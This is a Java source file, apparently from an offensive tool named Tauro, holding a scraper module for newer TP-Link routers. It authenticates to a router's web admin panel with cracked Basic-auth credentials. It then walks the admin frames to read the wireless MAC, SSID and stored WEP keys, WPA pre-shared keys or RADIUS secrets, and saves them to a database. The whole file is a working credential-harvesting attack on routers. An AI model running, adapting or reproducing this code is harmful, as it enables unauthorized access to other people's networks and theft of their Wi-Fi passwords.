/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import com.gargoylesoftware.htmlunit.ElementNotFoundException;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScrapperAndSaver;
import org.koreops.tauro.core.loggers.Logger;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.logging.Level;

/**
 * Scraper module for newer TP-Link Routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class NewTpLinkScraper extends AbstractScrapperAndSaver {

  public NewTpLinkScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return this.logNewTpLinkStation();
  }

  private boolean logNewTpLinkStation() {
    try {
      Document doc = Jsoup.connect(hostUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Logger.debug(host + ": Title: " + doc.title());

      if (!(tpLinkTitles.contains(doc.title())) && (!doc.title().startsWith("TL-"))) {
        Logger.debug(host + ": Not an New TP Link router.");
        return false;
      }

      System.out.println("Found New TP-LINK");

      webClient.addRequestHeader("Authorization", "Basic " + base64Login);
      HtmlPage mainPage = webClient.getPage(hostUrl);

      doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());

      Elements elements = doc.select("table#autoWidth tbody tr");

      String macAddr = "";
      boolean wifiAvailable = false;

      for (Element element : elements) {
        if (element.select("td#t_wireless") != null) {
          if ("Wireless".equalsIgnoreCase(element.select("td#t_wireless").text())) {
            wifiAvailable = true;
          }
        }
        if (wifiAvailable) {
          if (element.select("td.Item") != null) {
            if (element.select("td.Item").text().contains("MAC Address")) {
              // Found the wifi Mac. Log & exit before we pick up the next mac..
              macAddr = element.select("td:eq(1)").text();
              macAddr = macAddr.replace("-", ":");
              Logger.info(host + ": Found MAC: " + macAddr);
              break;
            }
          }
        }
      }

      if (!wifiAvailable) {
        Logger.error(host + ": Wifi not available.", true);
        return false;
      }

      Map<String, String> wifiData = new HashMap<>();

      wifiData.put("BSSID", macAddr.toLowerCase());

      HtmlPage menu = ((HtmlPage) mainPage.getFrameByName("bottomLeftFrame").getEnclosedPage()).getAnchorByText("Wireless").click();

      doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());
      elements = doc.select("html");
      if ((elements.get(0).select("input#ssid[name=ssid1]") != null) && (!"".equals(elements.get(0).select("input#ssid[name=ssid1]").val()))) {
        wifiData.put("SSID", elements.get(0).select("input#ssid[name=ssid1]").val());
      } else if ((elements.get(0).select("input#ssid[name=ssid]") != null) && (!"".equals(elements.get(0).select("input#ssid[name=ssid]").val()))) {
        wifiData.put("SSID", elements.get(0).select("input#ssid[name=ssid]").val());
      } else if ((elements.get(0).select("input#ssid1[name=ssid1]") != null)
          && (!"".equals(elements.get(0).select("input#ssid1[name=ssid1]").val()))) {
        wifiData.put("SSID", elements.get(0).select("input#ssid1[name=ssid1]").val());
      }

      Logger.info(host + ": Found SSID: " + wifiData.get("SSID"));

      try {
        menu.getAnchorByText("- Wireless Security").click();
      } catch (ElementNotFoundException ex) {
        try {
          menu.getAnchorByText("Security Settings").click();
          System.out.println("Clicked alternative 0!");
        } catch (ElementNotFoundException e) {
          try {
            menu.getAnchorByText("Wireless Security").click();
            System.out.println("Clicked alternative 1!");
          } catch (ElementNotFoundException x) {
            menu.getAnchorByText("- Security Settings").click();
            System.out.println("Clicked alternative 2!");
          }
        }
      }

      doc = Jsoup.parse(((HtmlPage) mainPage.getFrameByName("mainFrame").getEnclosedPage()).asXml());

      elements = doc.select("html");

      for (Element element : elements) {
        if (!"disabled".equalsIgnoreCase(element.select("input[name=key1]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key1]").val());
          for (Element e : element.select("select#length1 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
          break;
        }
        if (!"disabled".equalsIgnoreCase(element.select("input[name=key2]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key2]").val());
          for (Element e : element.select("select#length2 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
          break;
        }
        if (!"disabled".equalsIgnoreCase(element.select("input[name=key3]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key3]").val());
          for (Element e : element.select("select#length3 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
          break;
        }
        if (!"disabled".equalsIgnoreCase(element.select("input[name=key4]").attr("disabled"))) {
          wifiData.put("AuthType", "WEP");
          wifiData.put("key", element.select("input[name=key4]").val());
          for (Element e : element.select("select#length4 option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
          break;
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        if (!"".equals(elements.get(0).select("input#pskSecret").val())) {
          wifiData.put("AuthType", "WPA/WPA2 Personal");
          wifiData.put("key", elements.get(0).select("input#pskSecret").val());
          for (Element e : elements.select("select#pskCipher option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        if (!"".equals(elements.get(0).select("input#radiusSecret").val())) {
          wifiData.put("AuthType", "WPA/WPA2 Personal");
          wifiData.put("key", elements.get(0).select("input#radiusSecret").val());
          for (Element e : elements.select("select#wpaCipher option")) {
            if ("selected".equalsIgnoreCase(e.attr("selected"))) {
              wifiData.put("Encryption", e.text());
            }
          }
        }
      }

      if ((wifiData.get("Encryption") == null) && (wifiData.get("AuthType") == null)) {
        Logger.debug(host + ": Security disabled or not a standard router. Either way, not our concern.");
        return false;
      }

      Logger.info(host + ": Found key: " + wifiData.get("key"));
      Logger.info(host + ": Found AuthType: " + wifiData.get("AuthType"));
      Logger.info(host + ": Found Encryption: " + wifiData.get("Encryption"));

      updaterDao.saveStation(wifiData, host);

      return true;
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (FailingHttpStatusCodeException ex) {
      Logger.error(host + ": FailingHttpStatusCodeException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (ElementNotFoundException ex) {
      Logger.error(host + ": ElementNotFoundException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
      java.util.logging.Logger.getLogger(NewTpLinkScraper.class.getName()).log(Level.SEVERE, null, ex);
    }
    return false;
  }
}
